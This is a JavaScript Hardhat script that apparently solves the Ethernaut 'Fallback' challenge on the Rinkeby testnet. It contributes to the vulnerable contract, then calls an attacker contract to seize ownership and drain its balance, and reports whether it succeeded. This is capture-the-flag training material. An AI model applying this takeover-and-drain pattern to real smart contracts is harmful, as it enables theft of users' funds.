const { networkConfig } = require("../../helper-hardhat-config");
const { network, ethers } = require("hardhat");
const {
  abi: FallbackAbi,
} = require("../../artifacts/contracts/1-fallback/Fallback.sol/Fallback.json");

async function stealFunds() {
  const chainId = network.config.chainId;
  const { deployer, caller } = await getNamedAccounts();

  if (chainId == 4) {
    console.log("Rinkeby chain detected, getting deployed contracts...");
    const url = network.config.url;
    const provider = new ethers.providers.JsonRpcProvider(url);
    const signer = provider.getSigner();

    // getting deployed contracts
    const aFallback = networkConfig[chainId]["fallback"];
    const cFallback = new ethers.Contract(aFallback, FallbackAbi, signer);
    const cStealFunds = await ethers.getContract("StealFunds");

    // store the initial values
    const senderInitialBalance = await provider.getBalance(deployer);
    const fallbackInitialBalance = await provider.getBalance(cFallback.address);
    const fallbackInitialOwner = await cFallback.owner();

    // contribution from the deployer
    console.log("Deployer contributing to the contract...");
    const contributionTx = await cFallback.contribute({
      from: deployer,
      value: ethers.utils.parseEther("0.0001"),
    });

    // call the steal funds function
    console.log("Stealing funds...");
    const stealTx = await cStealFunds.stealFunds({
      from: deployer,
      value: "10000000000",
      gasLimit: "30000",
    });

    // check the final balances
    const senderFinalBalance = await provider.getBalance(deployer);
    const fallbackFinalBalance = await provider.getBalance(aFallback);
    const fallbackFinalOwner = await cFallback.owner();

    // checking final values
    if (fallbackFinalOwner == caller) {
      console.log("Ownership of the Fallback contract successfully claimed!");
    } else {
      console.log("Failed to claim the ownership of the Fallback contract.");
    }
    if (fallbackFinalBalance == "0") {
      console.log(
        "Balance of the Fallback contract successfully reduced to zero!"
      );
    } else {
      console.log(
        "Failed to reduce the balance of the Fallback contract to zero."
      );
    }
    console.log("========================================");
  }
}

stealFunds()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
